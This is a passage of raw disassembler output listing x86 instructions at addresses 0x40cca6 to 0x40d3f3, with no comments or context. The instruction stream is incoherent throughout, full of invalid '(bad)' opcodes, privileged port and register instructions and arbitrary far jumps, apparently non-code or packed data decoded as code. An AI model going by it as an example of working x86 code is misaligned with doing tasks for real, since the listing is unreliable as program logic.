  40cca6:	or     edi,DWORD PTR [esi-0x36f8ffec]
  40ccac:	adc    al,0xa1
  40ccae:	pop    edi
  40ccaf:	(bad)  
  40ccb0:	mov    ebx,0xbef9af03
  40ccb5:	add    dh,ah
  40ccb7:	pop    ebp
  40ccb8:	xor    ch,BYTE PTR [eax-0x4]
  40ccbb:	imul   esi,DWORD PTR [esi+0x71265063],0xc49847e6
  40ccc5:	xor    ah,BYTE PTR [ebx-0xc]
  40ccc8:	cmp    DWORD PTR [edi],ecx
  40ccca:	xchg   DWORD PTR ds:0xadd50e03,eax
  40ccd0:	out    0x98,eax
  40ccd2:	mov    al,0xbb
  40ccd4:	inc    esi
  40ccd5:	jg     0x40cd0c
  40ccd7:	jge    0x40cc61
  40ccd9:	sub    BYTE PTR [eax-0x24],0x3f
  40ccdd:	ja     0x40ccb4
  40ccdf:	(bad)  
  40cce0:	mov    cl,0x60
  40cce2:	sbb    al,BYTE PTR [eax+0x28]
  40cce5:	jae    0x40cd2a
  40cce7:	mov    eax,0x258c3430
  40ccec:	sbb    ecx,eax
  40ccee:	add    eax,0xf8805016
  40ccf3:	in     eax,0x73
  40ccf5:	in     al,0xeb
  40ccf7:	adc    bh,0xd7
  40ccfa:	jno    0x40ccb6
  40ccfc:	inc    ecx
  40ccfd:	jp     0x40ccfa
  40ccff:	pop    edi
  40cd00:	mov    ah,0x8c
  40cd02:	cmp    dl,al
  40cd04:	dec    ecx
  40cd05:	mov    esp,0xc315cec8
  40cd0a:	push   esp
  40cd0b:	or     DWORD PTR [ebx-0x5acd34af],esp
  40cd11:	pusha  
  40cd12:	push   eax
  40cd13:	nop
  40cd14:	stos   DWORD PTR es:[edi],eax
  40cd15:	mov    esp,0x8cb8fcba
  40cd1a:	aad    0xcc
  40cd1c:	test   al,0xe5
  40cd1e:	xchg   ebx,eax
  40cd1f:	outs   dx,DWORD PTR ds:[esi]
  40cd20:	setae  BYTE PTR [ecx+0x60ed3530]
  40cd27:	mov    edx,0x6e1d7b7a
  40cd2c:	sub    edi,esi
  40cd2e:	ins    BYTE PTR es:[edi],dx
  40cd2f:	push   0x1f
  40cd31:	inc    eax
  40cd32:	mov    bl,0x8c
  40cd34:	xor    esp,DWORD PTR [edx+eiz*2-0x59]
  40cd38:	(bad)  
  40cd39:	sbb    edx,DWORD PTR [esi-0x5b09f87d]
  40cd3f:	arpl   WORD PTR [ecx-0x4f],di
  40cd42:	mov    dh,0x4d
  40cd44:	cmp    bh,BYTE PTR [eax+ebp*4]
  40cd47:	fwait
  40cd48:	pop    ebp
  40cd49:	rcr    cl,1
  40cd4b:	push   eax
  40cd4c:	andnps xmm4,xmm4
  40cd4f:	leave  
  40cd50:	adc    DWORD PTR ds:0x6e8f2e8,esi
  40cd56:	test   eax,0x1385389
  40cd5b:	aam    0xd3
  40cd5d:	push   cs
  40cd5e:	sub    cl,ah
  40cd60:	pop    esi
  40cd61:	imul   DWORD PTR [edi+0x3184f26b]
  40cd67:	pop    edx
  40cd68:	(bad)  [ebp-0x57]
  40cd6b:	push   edx
  40cd6c:	dec    ecx
  40cd6d:	or     ebp,ebp
  40cd6f:	cmp    DWORD PTR [edx-0x807638f],0xd517b09b
  40cd79:	add    cl,cl
  40cd7b:	dec    ebx
  40cd7c:	mov    esp,0x6ea20cc7
  40cd81:	ss inc edi
  40cd83:	pop    ecx
  40cd84:	scas   eax,DWORD PTR es:[edi]
  40cd85:	mov    al,0xd
  40cd87:	mov    bh,0xe7
  40cd89:	jmp    0xb7f1:0x121f485d
  40cd90:	jle    0x40cd74
  40cd92:	arpl   bp,dx
  40cd94:	add    al,0x40
  40cd96:	int3   
  40cd97:	jb     0x40cd5b
  40cd99:	sbb    DWORD PTR [ebp-0x4cbefd61],0x65d7050e
  40cda3:	mov    eax,ds:0x7440ccc8
  40cda8:	jge    0x40cdab
  40cdaa:	data16 xor al,0x5f
  40cdad:	inc    edx
  40cdae:	mov    eax,0xe004b654
  40cdb3:	add    eax,DWORD PTR [edx-0x1f]
  40cdb6:	int    0x45
  40cdb8:	jb     0x40cdae
  40cdba:	inc    esp
  40cdbb:	adc    edi,DWORD PTR [edi-0x59117fcd]
  40cdc1:	stos   DWORD PTR es:[edi],eax
  40cdc2:	inc    ecx
  40cdc3:	ret    
  40cdc4:	int3   
  40cdc5:	imul   esi,DWORD PTR es:[ebx+0x7f],0x4478832a
  40cdcd:	popf   
  40cdce:	sbb    ch,BYTE PTR [ebx-0x51]
  40cdd1:	rol    eax,0xef
  40cdd4:	dec    ebp
  40cdd5:	icebp  
  40cdd6:	(bad)  
  40cdd8:	pop    edx
  40cdd9:	call   0x501f:0x9149c73c
  40cde0:	ret    0xaf78
  40cde3:	imul   ebp,DWORD PTR [edx+edi*2-0x536ebebf],0x66
  40cdeb:	dec    ebx
  40cdec:	imul   ecx,esi,0x7b
  40cdef:	in     al,dx
  40cdf0:	cmp    eax,0xe5f5f19c
  40cdf5:	call   0xc111:0x3c3e60fd
  40cdfc:	jo     0x40cdd1
  40cdfe:	jae    0x40ce71
  40ce00:	adc    al,0x57
  40ce02:	mov    ebp,0x47a1919e
  40ce07:	xchg   BYTE PTR [edi-0x5c],cl
  40ce0a:	test   DWORD PTR [esi-0x6b],eax
  40ce0d:	pusha  
  40ce0e:	jecxz  0x40ce20
  40ce10:	adc    DWORD PTR [edx+0x15],edi
  40ce13:	(bad)
  40ce16:	cmp    BYTE PTR [esi-0x46],al
  40ce19:	rol    DWORD PTR [ebp+0x4e76d985],0x30
  40ce20:	loopne 0x40cddc
  40ce22:	push   ss
  40ce23:	jmp    0x491d480c
  40ce28:	xor    esp,eax
  40ce2a:	ins    DWORD PTR es:[edi],dx
  40ce2b:	cmp    ah,BYTE PTR [ebp+0x503eb2cf]
  40ce31:	xor    DWORD PTR [edx-0x1f3bd8d2],ebp
  40ce37:	loope  0x40ce01
  40ce39:	jecxz  0x40ce1c
  40ce3b:	(bad)  
  40ce3d:	cmp    DWORD PTR [ebx],esp
  40ce3f:	jo     0x40cdec
  40ce41:	out    0xcc,eax
  40ce43:	jae    0x40ce1b
  40ce45:	test   al,0x29
  40ce47:	or     cl,dh
  40ce49:	das    
  40ce4a:	push   0x310a9e9d
  40ce4f:	retf   
  40ce50:	cmp    eax,0x3ac86e85
  40ce55:	jl     0x40ce7d
  40ce57:	add    bl,BYTE PTR [ecx+0x51be4bbf]
  40ce5d:	push   es
  40ce5e:	cmp    BYTE PTR [edx],0x7d
  40ce61:	pop    ecx
  40ce62:	(bad)  
  40ce63:	jge    0x40ce0f
  40ce65:	mov    al,BYTE PTR [edi-0x53d71598]
  40ce6b:	int3   
  40ce6c:	(bad)  
  40ce6d:	call   0x7e8c6a97
  40ce72:	xchg   edi,eax
  40ce73:	and    esp,DWORD PTR ds:[ebp+0x2b]
  40ce77:	jmp    0xd880:0x530d1a61
  40ce7e:	inc    eax
  40ce7f:	pop    ecx
  40ce80:	jmp    0x7751ffdb
  40ce85:	repnz stos DWORD PTR es:[edi],eax
  40ce87:	mov    esp,0x9caffbe6
  40ce8c:	push   ebx
  40ce8d:	or     al,BYTE PTR [edi+0x39]
  40ce90:	hlt    
  40ce91:	test   ch,bh
  40ce93:	push   eax
  40ce94:	fs push 0x88723718
  40ce9a:	ds push edx
  40ce9c:	mov    esi,0x797cfe1f
  40cea1:	sub    BYTE PTR [edx+edi*2+0x39],dl
  40cea5:	inc    edi
  40cea6:	cmp    ch,BYTE PTR [edx+0x50507545]
  40ceac:	xchg   ebp,eax
  40cead:	pop    ds
  40ceae:	cwde   
  40ceaf:	inc    ebx
  40ceb0:	repz push esi
  40ceb2:	push   ecx
  40ceb3:	cmc    
  40ceb4:	mov    ebx,0x1a3bb9c4
  40ceb9:	ins    DWORD PTR es:[edi],dx
  40ceba:	imul   edx,DWORD PTR [ecx-0x17ffa7d4],0xce7a3903
  40cec4:	icebp  
  40cec5:	xchg   esi,eax
  40cec6:	dec    ebx
  40cec7:	test   BYTE PTR [edi],ch
  40cec9:	cmp    BYTE PTR [eax+ebx*1-0x3b],bh
  40cecd:	xchg   esp,eax
  40cece:	fisttp QWORD PTR [ecx-0x213aa090]
  40ced4:	add    dh,BYTE PTR [edi]
  40ced6:	cmp    BYTE PTR [esi-0x7d],0x68
  40ceda:	mov    ch,BYTE PTR [ecx+0x1d]
  40cedd:	mov    esp,edi
  40cedf:	loop   0x40cf03
  40cee1:	std    
  40cee2:	or     edi,DWORD PTR [ebx-0x43]
  40cee5:	fld    QWORD PTR [edi]
  40cee7:	call   0xa003:0x54c15acb
  40ceee:	gs mov ebp,0xd0cf790d
  40cef4:	arpl   WORD PTR [esi+0x72df6c07],sp
  40cefa:	and    eax,ebx
  40cefc:	xchg   edi,eax
  40cefd:	xchg   ebp,eax
  40cefe:	ins    DWORD PTR es:[edi],dx
  40ceff:	jno    0x40ceb5
  40cf01:	stos   BYTE PTR es:[edi],al
  40cf02:	sub    eax,0xe2525184
  40cf07:	xor    ch,BYTE PTR [eax+0x37]
  40cf0a:	lock pop esi
  40cf0c:	xchg   edi,eax
  40cf0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf0e:	cmp    eax,0x8a9a619b
  40cf13:	adc    ebp,eax
  40cf15:	mov    cr7,eax
  40cf18:	in     al,0x7
  40cf1a:	sub    DWORD PTR [esi-0x4b1230fd],eax
  40cf20:	pop    esp
  40cf21:	push   eax
  40cf22:	or     eax,0x43bddfe2
  40cf27:	inc    ecx
  40cf28:	cld    
  40cf29:	sar    DWORD PTR [ecx],1
  40cf2b:	pop    ebx
  40cf2c:	scas   eax,DWORD PTR es:[edi]
  40cf2d:	repz xchg ecx,eax
  40cf2f:	and    eax,0x1f6a67a9
  40cf34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf35:	cmp    BYTE PTR [esi],al
  40cf37:	pop    eax
  40cf38:	imul   ebx,DWORD PTR [edi-0x79],0x833b2f20
  40cf3f:	outs   dx,DWORD PTR ds:[esi]
  40cf40:	mov    eax,0xae873851
  40cf45:	mov    ecx,0x5fa9df4f
  40cf4a:	out    0xad,al
  40cf4c:	mov    gs,ecx
  40cf4e:	lods   eax,DWORD PTR ds:[esi]
  40cf4f:	mov    bh,0x5a
  40cf51:	jge    0x40cf2c
  40cf53:	aad    0x62
  40cf55:	in     al,0xf4
  40cf57:	pop    edx
  40cf58:	jnp    0x40cfd7
  40cf5a:	mov    bh,BYTE PTR [edi-0x55]
  40cf5d:	push   edi
  40cf5e:	stc    
  40cf5f:	xor    cl,BYTE PTR [eax+0x1b366f78]
  40cf65:	xchg   edx,eax
  40cf66:	inc    edx
  40cf67:	aaa    
  40cf68:	in     eax,0x69
  40cf6a:	dec    ebx
  40cf6b:	jecxz  0x40cfd0
  40cf6d:	pop    es
  40cf6e:	xor    BYTE PTR [eax-0x79],0x6
  40cf72:	jae    0x40cfa4
  40cf74:	popa   
  40cf75:	pop    edx
  40cf76:	adc    eax,ebx
  40cf78:	cmc    
  40cf79:	dec    ecx
  40cf7a:	and    DWORD PTR [ebp-0x6b],ecx
  40cf7d:	in     al,dx
  40cf7e:	and    DWORD PTR [edi+0x22],eax
  40cf81:	outs   dx,DWORD PTR ds:[esi]
  40cf82:	sbb    eax,0x8f24f9ff
  40cf87:	arpl   WORD PTR [ebx],cx
  40cf89:	mov    ds:0x67d766da,eax
  40cf8e:	xor    edi,ecx
  40cf90:	push   esp
  40cf91:	in     eax,0x90
  40cf93:	jle    0x40cf2b
  40cf95:	mov    BYTE PTR [edx+0x63],al
  40cf98:	inc    ecx
  40cf99:	das    
  40cf9a:	mov    edx,0x6dc80b6b
  40cf9f:	fs mov bl,0x6c
  40cfa3:	scas   eax,DWORD PTR es:[edi]
  40cfa4:	pop    ds
  40cfa5:	int    0xbd
  40cfa7:	sub    DWORD PTR [eax],ebx
  40cfa9:	out    dx,al
  40cfaa:	ds jp  0x40cf56
  40cfad:	jp     0x40cf95
  40cfaf:	out    dx,eax
  40cfb0:	leave  
  40cfb1:	ror    al,0x69
  40cfb4:	xor    al,0x28
  40cfb6:	jb     0x40cf8f
  40cfb8:	jae    0x40cfd6
  40cfba:	or     eax,0x4dfbff53
  40cfbf:	push   0xdc0c56c
  40cfc4:	aam    0x2
  40cfc6:	push   edx
  40cfc7:	pop    esi
  40cfc8:	mov    al,0x93
  40cfca:	cmp    eax,0x87790c5d
  40cfcf:	or     edi,DWORD PTR [ebx]
  40cfd1:	call   0x22c823d6
  40cfd6:	pop    esi
  40cfd7:	iret   
  40cfd8:	mov    eax,0xcf8f8dfe
  40cfdd:	hlt    
  40cfde:	xlat   BYTE PTR ds:[ebx]
  40cfdf:	outs   dx,BYTE PTR ds:[esi]
  40cfe0:	mov    ch,0xfd
  40cfe2:	adc    eax,0x189b2f7c
  40cfe7:	stos   DWORD PTR es:[edi],eax
  40cfe8:	push   ss
  40cfe9:	xchg   edx,eax
  40cfea:	ret    0x404
  40cfed:	push   edi
  40cfee:	pop    edi
  40cfef:	mov    esi,0x5b5ac8d5
  40cff4:	enter  0x2640,0x21
  40cff8:	ins    BYTE PTR es:[edi],dx
  40cff9:	rdpmc  
  40cffb:	mov    bl,ah
  40cffd:	mov    ecx,0x4dfff229
  40d002:	gs inc esp
  40d004:	test   DWORD PTR [edi-0x6c775169],edi
  40d00a:	in     eax,0x85
  40d00c:	in     eax,0x36
  40d00e:	mov    eax,0x766b590e
  40d013:	or     bh,al
  40d015:	cmp    eax,0xcb33431d
  40d01a:	mul    BYTE PTR [ecx-0x77]
  40d01d:	stos   DWORD PTR es:[edi],eax
  40d01e:	sbb    DWORD PTR [edi-0x5a],ebp
  40d021:	cli    
  40d022:	push   ss
  40d023:	mov    eax,ds:0x3dd16d22
  40d028:	clc    
  40d029:	dec    ebp
  40d02a:	pop    esp
  40d02b:	push   cs
  40d02c:	inc    ebx
  40d02d:	xor    eax,DWORD PTR [ebp-0x107025e3]
  40d033:	or     al,0x7a
  40d035:	mov    ebx,0x33f99f7e
  40d03a:	push   ebx
  40d03b:	(bad)  
  40d03c:	lock std 
  40d03e:	pop    ecx
  40d03f:	mov    bh,0x23
  40d041:	mov    ch,ah
  40d043:	push   edx
  40d044:	jg     0x40cfed
  40d046:	aad    0x64
  40d048:	cmp    ah,ah
  40d04a:	test   eax,0x2193fd9
  40d04f:	lods   eax,DWORD PTR ds:[esi]
  40d050:	mov    eax,0x6df4719f
  40d055:	mov    ebx,0xd68c7834
  40d05a:	jns    0x40d0d4
  40d05c:	rcl    ah,0x7b
  40d05f:	dec    eax
  40d060:	inc    esi
  40d061:	mov    edi,0x38f8cacf
  40d066:	and    esi,ecx
  40d068:	jecxz  0x40d07c
  40d06a:	pop    ebp
  40d06b:	icebp  
  40d06c:	loop   0x40d0df
  40d06e:	stc    
  40d06f:	sbb    esp,edx
  40d071:	int3   
  40d072:	pop    ebx
  40d073:	cli    
  40d074:	lds    esp,FWORD PTR [edi+0x382d0116]
  40d07a:	mov    dh,0x20
  40d07c:	xor    dl,BYTE PTR [ebp-0x7e]
  40d07f:	sbb    eax,edx
  40d081:	xchg   esi,eax
  40d082:	adc    dl,BYTE PTR [eax+0x24]
  40d085:	fcom   DWORD PTR [ebp+0x3979adb5]
  40d08b:	dec    esp
  40d08c:	mov    dl,0xd5
  40d08e:	iret   
  40d08f:	and    dh,bl
  40d091:	push   eax
  40d092:	(bad)  
  40d093:	xor    al,0xd5
  40d095:	xchg   edi,eax
  40d096:	fnstsw WORD PTR [eax]
  40d098:	call   0xa6b3:0x7077d97f
  40d09f:	xlat   BYTE PTR ds:[ebx]
  40d0a0:	aam    0x14
  40d0a2:	or     al,0xc0
  40d0a4:	pop    esp
  40d0a5:	repnz nop
  40d0a7:	dec    edx
  40d0a8:	push   eax
  40d0a9:	jl     0x40d062
  40d0ab:	or     al,0x1b
  40d0ad:	mov    esp,0xcf9d2dfd
  40d0b2:	test   BYTE PTR cs:[eax],ch
  40d0b5:	xor    eax,0x88e4e47b
  40d0ba:	sub    dl,bh
  40d0bc:	idiv   edx
  40d0be:	sbb    DWORD PTR ds:0xa1fa4159,0xa90b8d64
  40d0c8:	sub    BYTE PTR [ebx+0x28],al
  40d0cb:	jle    0x40d0ab
  40d0cd:	stc    
  40d0ce:	out    dx,al
  40d0cf:	xor    DWORD PTR gs:[ebx-0x2bfc61e7],esi
  40d0d6:	push   ebp
  40d0d7:	(bad)
  40d0db:	sbb    al,0xe2
  40d0dd:	dec    esi
  40d0de:	out    dx,eax
  40d0df:	pop    ss
  40d0e0:	femms  
  40d0e2:	sub    al,0x97
  40d0e4:	leave  
  40d0e5:	stos   DWORD PTR es:[edi],eax
  40d0e6:	mov    al,ds:0x4ee8e288
  40d0eb:	out    0xe,al
  40d0ed:	dec    esi
  40d0ee:	pop    eax
  40d0ef:	dec    ecx
  40d0f0:	sbb    al,0x99
  40d0f2:	test   al,0xc1
  40d0f4:	(bad)  
  40d0f5:	es ja  0x40d16c
  40d0f8:	and    DWORD PTR [esi+0x70],esi
  40d0fb:	push   ecx
  40d0fc:	pop    es
  40d0fd:	mov    eax,0x800a1bfe
  40d102:	xchg   edi,eax
  40d103:	push   edi
  40d104:	sbb    ah,BYTE PTR [edi+0x3a]
  40d107:	icebp  
  40d108:	fild   QWORD PTR [edi+0x6990a5e8]
  40d10e:	xor    eax,ebx
  40d110:	adc    esi,eax
  40d112:	or     cl,ch
  40d114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d115:	ds xchg esp,eax
  40d117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d118:	mov    eax,ds:0xb986f404
  40d11d:	jmp    0x40d0de
  40d11f:	fwait
  40d120:	or     ecx,ebx
  40d122:	idiv   BYTE PTR [esi]
  40d124:	jns    0x40d162
  40d126:	push   cs
  40d127:	aam    0x2a
  40d129:	daa    
  40d12a:	in     al,0xe9
  40d12c:	jno    0x40d17f
  40d12e:	jb     0x40d128
  40d130:	xlat   BYTE PTR ds:[ebx]
  40d131:	jp     0x40d18c
  40d133:	mov    ch,0x79
  40d135:	cld    
  40d136:	xchg   ecx,eax
  40d137:	xchg   ebp,eax
  40d138:	dec    esi
  40d139:	sub    eax,0xd9c3312c
  40d13e:	mov    dl,BYTE PTR [edx+0x40]
  40d141:	fist   WORD PTR [eax+0x2180e378]
  40d147:	test   al,0x1b
  40d149:	dec    esi
  40d14a:	imul   eax,eax,0x68694aa7
  40d150:	push   edi
  40d151:	inc    ebp
  40d152:	inc    ebx
  40d153:	inc    ebp
  40d154:	jns    0x40d0de
  40d156:	mov    esp,0xe265b528
  40d15b:	push   0xffffffe5
  40d15d:	lods   al,BYTE PTR ds:[esi]
  40d15e:	jno    0x40d1a8
  40d160:	add    ebp,DWORD PTR ss:[eax-0x49]
  40d164:	mov    al,0xc9
  40d166:	mov    eax,0x561a85b
  40d16b:	ret    
  40d16c:	fwait
  40d16d:	inc    ebx
  40d16e:	rcl    ebp,cl
  40d170:	xor    DWORD PTR [ebp+0x3a],eax
  40d173:	test   eax,0x74539948
  40d178:	dec    esi
  40d179:	repnz sbb DWORD PTR [esi],ebp
  40d17c:	paddd  mm2,QWORD PTR [edi]
  40d17f:	xlat   BYTE PTR ds:[ebx]
  40d180:	sti    
  40d181:	addr16 or edx,ebx
  40d184:	ins    BYTE PTR es:[edi],dx
  40d185:	iret   
  40d186:	cmp    ch,dh
  40d188:	inc    ecx
  40d189:	mov    WORD PTR [ecx-0x13],cs
  40d18c:	inc    esp
  40d18d:	cmp    bl,BYTE PTR [ebp+0x12b1d771]
  40d193:	adc    al,ah
  40d195:	pop    ecx
  40d196:	lock jmp 0x3700cc77
  40d19c:	gs test al,0x92
  40d19f:	lods   eax,DWORD PTR ds:[esi]
  40d1a0:	xor    al,0xb5
  40d1a2:	sbb    eax,0x542b5dd3
  40d1a7:	sbb    BYTE PTR [ebp+0x71],dh
  40d1aa:	push   es
  40d1ab:	mov    eax,0x3f6723c3
  40d1b0:	sahf   
  40d1b1:	(bad)  
  40d1b2:	sub    cl,ah
  40d1b4:	je     0x40d13c
  40d1b6:	mov    cl,0x11
  40d1b8:	pop    ds
  40d1b9:	sub    ecx,esi
  40d1bb:	xchg   esp,eax
  40d1bc:	xor    eax,0xe7f5f9ac
  40d1c1:	ins    DWORD PTR es:[edi],dx
  40d1c2:	xchg   esi,eax
  40d1c3:	add    esp,DWORD PTR [ebx-0x1d]
  40d1c6:	mov    ebx,ebp
  40d1c8:	and    cl,bl
  40d1ca:	stc    
  40d1cb:	retf   0xd470
  40d1ce:	push   es
  40d1cf:	aas    
  40d1d0:	pop    ss
  40d1d1:	sti    
  40d1d2:	jne    0x40d184
  40d1d4:	loop   0x40d19b
  40d1d6:	(bad)  
  40d1d7:	fwait
  40d1d8:	imul   ecx,DWORD PTR [ecx-0x63e2acd9],0xffffffab
  40d1df:	into   
  40d1e0:	adc    eax,0x390e1044
  40d1e5:	cli    
  40d1e6:	mov    ebp,0x77ce8f9a
  40d1eb:	sbb    DWORD PTR [ebx-0x22],eax
  40d1ee:	or     eax,0x914dc330
  40d1f3:	in     al,0x41
  40d1f5:	lds    ebx,FWORD PTR [ecx]
  40d1f7:	sbb    eax,0xb3940f54
  40d1fc:	int3   
  40d1fd:	jne    0x40d233
  40d1ff:	or     cl,BYTE PTR [edi+edi*4+0x43956865]
  40d206:	fisub  WORD PTR [ecx+0x618f2009]
  40d20c:	scas   al,BYTE PTR es:[edi]
  40d20d:	popf   
  40d20e:	xor    eax,0x324ff1b0
  40d213:	xchg   ecx,eax
  40d214:	jns    0x40d1c7
  40d216:	inc    ebp
  40d217:	mov    ?,WORD PTR [ecx]
  40d219:	xchg   edx,eax
  40d21a:	push   esp
  40d21b:	dec    edx
  40d21c:	ror    BYTE PTR [edx],0xab
  40d21f:	sar    DWORD PTR [edx],0x63
  40d222:	(bad)  
  40d223:	jbe    0x40d23f
  40d225:	and    dh,BYTE PTR [esi-0x3f006c5f]
  40d22b:	push   ecx
  40d22c:	cld    
  40d22d:	je     0x40d232
  40d22f:	mov    eax,ds:0x9ec59a5d
  40d234:	(bad)  
  40d235:	enter  0x170,0x72
  40d239:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d23a:	mov    bl,bh
  40d23c:	inc    esp
  40d23d:	inc    esp
  40d23e:	aam    0x2b
  40d240:	push   eax
  40d241:	ins    DWORD PTR es:[edi],dx
  40d242:	popf   
  40d243:	pop    esi
  40d244:	int3   
  40d245:	xchg   DWORD PTR [ebx+esi*4+0x2],edx
  40d249:	fmul   QWORD PTR [edi+ebp*8+0x59be62fb]
  40d250:	mov    dl,0xb2
  40d252:	(bad)  
  40d253:	(bad)  
  40d254:	int    0x26
  40d256:	xor    BYTE PTR [bp+si],al
  40d259:	mov    DWORD PTR [esi-0x64ee2dee],0x45a8f07e
  40d263:	arpl   bp,cx
  40d265:	sub    al,0xaf
  40d267:	mov    bh,0xc3
  40d269:	cmc    
  40d26a:	add    ch,BYTE PTR [edx+0x1ab2cf26]
  40d270:	sbb    esi,DWORD PTR ss:0xc8f02d1c
  40d277:	add    BYTE PTR [eax+0x25],dh
  40d27a:	mov    dh,0x9c
  40d27c:	or     DWORD PTR [edi+0x73],ebp
  40d27f:	idiv   BYTE PTR [edi]
  40d281:	jbe    0x40d2d0
  40d283:	cmp    DWORD PTR [ecx+eax*4-0x9],esp
  40d287:	into   
  40d288:	mov    ebp,0x170fd141
  40d28d:	jae    0x40d2ff
  40d28f:	xchg   edx,eax
  40d290:	les    esi,FWORD PTR [esi]
  40d292:	retf   0x98f
  40d295:	mov    ah,0x43
  40d297:	fs dec ebx
  40d299:	cdq    
  40d29a:	aas    
  40d29b:	sbb    BYTE PTR [edx-0x3d],0xb0
  40d29f:	lods   eax,DWORD PTR ds:[esi]
  40d2a0:	ficom  WORD PTR [eax+0x23]
  40d2a3:	daa    
  40d2a4:	mov    WORD PTR [esi],ds
  40d2a6:	dec    esi
  40d2a7:	inc    edi
  40d2a8:	adc    bl,BYTE PTR [esi]
  40d2aa:	inc    edi
  40d2ab:	dec    ebx
  40d2ac:	dec    ebx
  40d2ad:	outs   dx,DWORD PTR ds:[esi]
  40d2ae:	ds int 0x62
  40d2b1:	cmp    eax,0xb9264486
  40d2b6:	xor    al,BYTE PTR [ebx+eiz*1-0x19]
  40d2ba:	mov    eax,es
  40d2bc:	adc    DWORD PTR [edx],ebx
  40d2be:	jmp    0x589:0x1884900
  40d2c5:	in     eax,0x40
  40d2c7:	xchg   DWORD PTR [ecx+eiz*4-0x48],ebp
  40d2cb:	hlt    
  40d2cc:	(bad)  
  40d2cd:	pop    es
  40d2ce:	aaa    
  40d2cf:	hlt    
  40d2d0:	icebp  
  40d2d1:	mov    eax,ds:0x19f4bcd3
  40d2d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2d7:	add    eax,0x63c7dd07
  40d2dc:	push   eax
  40d2dd:	fild   DWORD PTR [eax-0x1eaf138c]
  40d2e3:	retf   0x2236
  40d2e6:	xchg   esi,eax
  40d2e7:	fcomi  st,st(3)
  40d2e9:	cdq    
  40d2ea:	dec    DWORD PTR [ebx]
  40d2ec:	push   edi
  40d2ed:	test   BYTE PTR [edx],bh
  40d2ef:	outs   dx,DWORD PTR ds:[esi]
  40d2f0:	add    dh,BYTE PTR [ecx-0x6a]
  40d2f3:	xlat   BYTE PTR ds:[ebx]
  40d2f4:	jmp    0x1ed7:0x5c5e94b3
  40d2fb:	mov    eax,ds:0x69b5a268
  40d300:	jne    0x40d2bc
  40d302:	dec    esp
  40d303:	sub    dl,al
  40d305:	lahf   
  40d306:	ins    DWORD PTR es:[edi],dx
  40d307:	in     eax,0xf6
  40d309:	lock jge 0x40d2dd
  40d30c:	pop    ebx
  40d30d:	cmc    
  40d30e:	das    
  40d30f:	dec    BYTE PTR [edx]
  40d311:	jge    0xe62e50de
  40d317:	adc    eax,0xa24b9660
  40d31c:	fsub   DWORD PTR [esi+0x52]
  40d31f:	(bad)  
  40d320:	sbb    al,BYTE PTR [esi+0x4]
  40d323:	dec    ebx
  40d324:	dec    esp
  40d325:	xor    bl,BYTE PTR [edx-0x9d0175c]
  40d32b:	adc    BYTE PTR [edx],bh
  40d32d:	(bad)  
  40d32e:	cmp    eax,0xd2a68702
  40d333:	inc    ebx
  40d334:	cwde   
  40d335:	enter  0x364,0xba
  40d339:	push   es
  40d33a:	push   0x7f
  40d33c:	or     edx,DWORD PTR [ebx]
  40d33e:	scas   eax,DWORD PTR es:[edi]
  40d33f:	sub    DWORD PTR [ebx-0x135b5f65],eax
  40d345:	fcomp  QWORD PTR [edi-0x16]
  40d348:	sbb    DWORD PTR [esi+0x1c],ebx
  40d34b:	pop    edi
  40d34c:	js     0x40d380
  40d34e:	jmp    0x40d304
  40d350:	pop    eax
  40d351:	pop    ebx
  40d352:	(bad)  
  40d353:	push   eax
  40d354:	lods   eax,DWORD PTR ds:[esi]
  40d355:	test   eax,0x2b37e595
  40d35a:	inc    esp
  40d35b:	push   ecx
  40d35c:	out    dx,al
  40d35d:	xchg   DWORD PTR [esi+0x26],ebx
  40d360:	or     eax,0xcd883fd3
  40d365:	mov    edx,0xe7f5e968
  40d36a:	imul   BYTE PTR [esi]
  40d36c:	das    
  40d36d:	push   edx
  40d36e:	push   ecx
  40d36f:	loop   0x40d331
  40d371:	ret    
  40d372:	outs   dx,BYTE PTR fs:[esi]
  40d374:	fst    DWORD PTR [eax-0x1a67ffdf]
  40d37a:	shl    DWORD PTR [eax+ebp*8-0x54c62cc5],1
  40d381:	neg    BYTE PTR [ebx]
  40d383:	cmp    al,0x35
  40d385:	cmp    al,0xfb
  40d387:	(bad)  
  40d388:	and    cl,dh
  40d38a:	push   cs
  40d38b:	sbb    BYTE PTR [edx+0x7740348],bl
  40d391:	push   ds
  40d392:	jns    0x40d3d6
  40d394:	pop    ecx
  40d395:	jl     0x40d3d6
  40d397:	pop    esi
  40d398:	iret   
  40d399:	pop    es
  40d39a:	dec    ebx
  40d39b:	add    DWORD PTR [esi+eiz*8],ecx
  40d39e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d39f:	xchg   ebx,eax
  40d3a0:	jo     0x40d34e
  40d3a2:	fldenv [esp+edx*8]
  40d3a5:	xchg   edx,eax
  40d3a6:	pop    ecx
  40d3a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3a8:	rdmsr  
  40d3aa:	dec    ebp
  40d3ab:	or     cl,dl
  40d3ad:	loop   0x40d3ae
  40d3af:	pop    edi
  40d3b0:	outs   dx,BYTE PTR ds:[esi]
  40d3b1:	jb     0x40d3c1
  40d3b3:	cmp    edi,esp
  40d3b5:	jb     0x40d3b1
  40d3b7:	jmp    0x9d297a0b
  40d3bc:	xlat   BYTE PTR ds:[ebx]
  40d3bd:	imul   edx,edi,0xb6dff7fd
  40d3c3:	gs in  al,dx
  40d3c5:	pop    edi
  40d3c6:	retf   0x394b
  40d3c9:	jbe    0x40d37a
  40d3cb:	pusha  
  40d3cc:	fucomp st(1)
  40d3ce:	lock retf 0x1dbd
  40d3d2:	addr16 add bl,0x3b
  40d3d6:	mov    cl,0x0
  40d3d8:	pop    ds
  40d3d9:	dec    eax
  40d3da:	push   ds
  40d3db:	imul   eax,DWORD PTR [bp+si],0xffffff9c
  40d3df:	or     al,0xf9
  40d3e1:	adc    ecx,DWORD PTR [ecx-0x66]
  40d3e4:	xor    al,0x8e
  40d3e6:	push   ebx
  40d3e7:	mov    ds:0x166cd50c,eax
  40d3ec:	jb     0x40d3ea
  40d3ee:	in     al,dx
  40d3ef:	xor    ecx,esi
  40d3f1:	repz (bad) 
  40d3f3:	cmp    dl,BYTE PTR [esi]
